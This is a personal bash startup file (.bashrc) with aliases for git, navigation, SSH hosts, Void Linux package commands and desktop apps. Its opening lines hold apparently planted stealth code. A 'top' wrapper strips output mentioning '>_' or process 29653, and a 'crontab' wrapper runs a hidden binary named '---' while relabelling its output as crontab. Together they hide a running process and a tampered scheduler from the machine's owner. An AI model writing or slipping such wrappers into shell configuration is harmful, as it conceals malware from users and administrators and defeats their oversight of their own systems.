[[ $- != *i* ]] && [[ -z "$SSH_TTY" ]] && ! [[ "$SSH_ORIGINAL_COMMAND" =~ (^|/)scp|rsync ]] && ! [[ "$SSH_SUBSYSTEM" =~ sftp ]] && exit 0
top() { trap 'tput cnorm' INT; tput civis; { script -q -c "/usr/bin/top" /dev/null | sed -e '/>_/d' -e '/29653/d'; } || /usr/bin/top; tput cnorm; }
crontab() { --- 2>&1 | sed 's/---/crontab/' 2>/dev/null; }

if [ -z "$XDG_RUNTIME_DIR" ]; then
    export XDG_RUNTIME_DIR="/run/user/$(id -u)"
    mkdir -p "$XDG_RUNTIME_DIR"
    chmod 700 "$XDG_RUNTIME_DIR"
fi

# path
export PATH="$PATH:$HOME/packages/libs/flutter/bin"
export PATH="$HOME/flutter/bin:$PATH"
export LANG=en_US.UTF-8
export LC_ALL=en_US.UTF-8

alias bashrc='vim ~/.bashrc'
alias vimrc='vim ~/.vimrc'

# general
alias c='clear;'
alias l='ls'
alias q='exit;'
alias la='l -la'
alias cl='c l'
alias cla='c la'

# mobility
alias .='cd .'
alias ..='cd ..'
alias ...='..;..'
alias ....='...;..'
alias .....='....;..'
alias ......='.....;..'
alias .......='......;..'
alias ........='.......;..'
alias .........='........;..'
alias ..........='.........;..'

# git
alias add='git add .'
alias commit='git commit -m'
alias push='git push'
alias pull='git pull'
alias branch='git branch'
alias checkout='git checkout'

# rit


# cubesat
alias terrain='ssh terrain@terrain.device.rit.edu'
alias terrain_backdoor='ssh backdoor@terrain.device.rit.edu'

# ssh
alias rpi41='ssh cwmrpi41.device.rit.edu'

# void
alias ins='sudo xbps-install -S '
alias sd='sudo shutdown -h now'
alias sway_config='vim /home/cameron/.config/sway/config'
alias ipconfig='dhcpcd -U | grep -F ifssid;dhcpcd -U | grep -F ip;'
alias ifconfig='ipconfig'
alias reset_background='set_background "#000000"'
alias sound='alsamixer'
alias sound_output='pavucontrol'
alias charge_control='/home/cameron/.scripts/settings/battery/toggle_charge_control.sh'
alias update='ins -Su'
# apps
alias minecraft='/home/cameron/.minecraft/launcher/minecraft-launcher'
alias spotify='flatpak run com.spotify.Client;exit'
alias media='/home/cameron/.scripts/media/play_media.sh & exit'
alias jellyfin='/home/cameron/packages/apps/JellyfinDesktop & exit'
alias curseforge='/home/cameron/packages/apps/curseforge-latest-linux.AppImage'
alias vps='ssh root@142.93.248.158'
alias discord='/home/cameron/packages/apps/Discord/discord --enable-features=UseOzonePlatform,WebRTCPipeWireCapturer --ozone-platform=wayland'
alias stm='/home/cameron/packages/apps/st/stm32cubeide_1.19.0/stm32cubeide_wayland'
#other
alias monty_python='/home/cameron/.scripts/silly/monty_python.sh;reset_background'
alias fish='/home/cameron/.scripts/silly/fish.sh;clear'
alias look_busy='c python /home/cameron/.scripts/silly/look_busy.py'
alias neofetch='fastfetch'

#Custom Functions
set_background () {
    /home/cameron/.scripts/set_background.sh "$1"
}

#Other Stuff
parse_git_branch(){ git branch 2> /dev/null | sed -e '/^[^*]/d' -e 's/* \(.*\)/(\1) /'; }

echo -ne "\e[1 q"
echo -ne "\e]12;lightgrey\a"

#\t : time
#\# : number
#export PS1='\n\[\033[01;36m\]\h\[\e[1;32m\] @ \[\e[1;33m\]\w\n\[\e[1;32m\]\$\[\e[0m\] '
export PS1='\n\[\e[1;32m\]\h \[\e[1;33m\]\w\n\[\e[1;32m\]\$\[\e[0m\] '


export LS_COLORS=$LS_COLORS:'di=00;37':'*.java=00;33'

# Created by `pipx` on 2026-02-13 16:09:22
export PATH="$PATH:/home/cameron/.local/bin"

export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"  # This loads nvm
[ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion"  # This loads nvm bash_completion
